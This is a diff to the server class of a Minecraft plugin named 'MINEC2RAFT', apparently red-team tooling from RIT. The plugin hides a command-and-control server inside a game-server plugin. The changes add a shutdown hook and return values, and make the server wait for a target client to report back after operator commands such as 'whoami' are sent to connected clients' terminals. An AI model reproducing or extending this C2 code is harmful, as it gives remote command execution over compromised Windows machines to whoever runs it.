@@ -53,6 +53,14 @@ public class Server {
     public void runServer(JavaPlugin plugin) throws IOException {
         System.out.println(GREEN + "Server Created. Listening for clients..." + RESET);
 
+        Runtime.getRuntime().addShutdownHook(new Thread(()-> {
+            try {
+                serverSocket.close();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }));
+
         //schedule bukkit thread to handle communications between server any any clients
          connectionThread = Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
             try {
@@ -71,12 +79,13 @@ public class Server {
             } 
         });
         
-        System.out.println(YELLOW + "Type 'coms' for a list of commands." + RESET);
+        System.out.println(YELLOW + "Type '/coms' for a list of commands." + RESET);
     }    
 
     /**
      * Method that helps runServer() interpret user commands. 
-     * Some special commands have been added for ease of use, and any non-special commands will be interpreted through the client's terminal.
+     * Some special commands have been added for ease of use, and any non-special commands will be 
+     * interpreted through the client's terminal.
      * @param cmd - the user input.
      */
     public static String commandHandler(String cmd, String target, CommandSender sender) {
@@ -89,6 +98,7 @@ public class Server {
                 break;
             case "user", "client":
                 reply = "whoami";
+
                 returnStr = broadcast(reply, null, target);
                 break;
             case "coms", "commands", "cmds", "HELP": 
@@ -101,8 +111,7 @@ public class Server {
                             + "       ******************************************\n\n" 
                             + "WINDOWS ONLY\n(i'll add linux soon) but like lowk you can use a remote terminal \n" 
                             + "Thats all you need to know foo\n";
-                BroadcastPrintStream.println(reply, false);
-                break;
+                  return reply;
             case "poop":
                 for(int i = 1; i <= 100; i++) {
                     System.out.println(i + ": Poop");
@@ -111,11 +120,10 @@ public class Server {
             case "about", "abt":
                 reply = "\n░▒▓ MINEC2RAFT ▓▒░\n" 
                         + "Version: " + VERSION_NUM 
-                        + "\nWritten by Austin Hall for RIT's Red Team.\n" 
+                        + "\nWritten by  for RIT's Red Team.\n" 
                         + "For fun too lowk...\n\n" 
                         + "A dud?\n/give @p oak_sapling 100";
-                  BroadcastPrintStream.println(reply, sender, false);
-                break;
+                  return reply;
             case "sockets", "clients", "list", "lst", "array", "arr": //this does not need to be here anymore but will stay for legacy
                 formatArrLst();
                 break;                
@@ -137,7 +145,6 @@ public class Server {
         }
         if(clients.isEmpty()) {
             System.out.println(RED + "No clients connected." + RESET);
-            
         }
 
         if(response != null) {
@@ -145,13 +152,15 @@ public class Server {
                 for(ClientHandler client : clients) {
                     if (client != sender) {
                         client.sendMessage("CMD: " + msg);
-                        return client.getRecentLn();
                     }
                 }
             } else {
                 try {
-                    clients.get(Integer.parseInt(response)).sendMessage("CMD: " + msg);
-                    return clients.get(Integer.parseInt(response)).getRecentLn();
+                    int destination = Integer.parseInt(response);
+                    clients.get(destination).sendMessage("CMD: " + msg);
+                    try {
+                        return clients.get(destination).waitForBroadcast();
+                    } catch(InterruptedException e) { return null;}
                 } catch(Exception e) {
                     System.out.println("Invalid Target!");
                 }
